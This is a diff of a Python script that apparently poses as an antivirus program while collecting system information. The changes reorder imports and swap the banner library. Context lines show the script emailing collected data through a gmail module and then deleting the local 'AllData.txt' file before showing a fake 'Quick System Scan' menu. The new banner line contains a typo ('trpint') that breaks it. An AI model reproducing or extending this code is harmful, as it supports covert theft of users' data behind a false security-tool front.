@@ -15,15 +15,15 @@ The author has no responsibility for any illegal activity/activities carried out
 
 #Imports
 try:
+    import time
+    import platform
+    from os import system
     import sys
     import os
     import socket
     import nmap
-    import locale 
-    import platform
-    import time
+    import locale
     import random
-    import pyfiglet
     import geocoder
     import requests
     import http
@@ -38,13 +38,13 @@ try:
     import sniffer
     import gmail
     import psutil
-    import datetime
     import wmi
     import logging
     import re
     import uuid
     import device_detector
-    from os import system
+    import art
+    from art import tprint
     from device_detector import DeviceDetector
     from device_detector import SoftwareDetector
     from geopy.geocoders import Nominatim
@@ -110,8 +110,7 @@ gmail1.send(message)
 time.sleep(2)
 os.remove("AllData.txt")
 num=random.randint(1,24)
-antivirus=pyfiglet.figlet_format("ANTIVIRUS")
-print(antivirus)
+trpint("ANTIVIRUS",font="tarty1")
 time.sleep(2)
 print("[1] : Quick System Scan")
 time.sleep(1)
